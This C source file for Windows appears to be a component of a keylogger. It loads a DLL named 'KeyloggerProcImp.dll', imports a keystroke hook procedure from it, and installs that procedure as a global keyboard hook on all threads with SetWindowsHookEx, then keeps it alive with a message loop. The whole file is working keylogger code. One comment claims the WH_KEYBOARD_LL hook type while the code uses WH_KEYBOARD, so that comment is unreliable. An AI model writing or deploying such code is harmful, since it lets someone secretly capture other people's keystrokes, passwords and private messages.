#include "Common.h"
#include <Windows.h>

static wchar_t const* dllName = L"KeyloggerProcImp.dll";
static HMODULE hLib = NULL;
static HOOKPROC keyloggerProc = NULL;

// for WH_KEYBOARD
int loadHookProc() {
    hLib = LoadLibraryW(dllName);
    if (hLib == NULL) {
        printError("cannot load KeyloggerProcImp.dll");
        return 1;
    }
    keyloggerProc = (HOOKPROC)GetProcAddress(hLib, "_keyloggerProc@12");
    if (keyloggerProc == NULL) {
        printError("cannot import keyloggerProc");
        return 1;
    }
    return 0;
}

// an keylogging approach using SetWindowsHookEx with WH_KEYBOARD_LL type
int usingHighLevelKeyboardHook() {
    if (loadHookProc()) {
        return 1;
    }

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, keyloggerProc, hLib, 0);

    if (hHook == NULL) {
        printError("cannot hook keyboard events");
        return 1;
    }

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}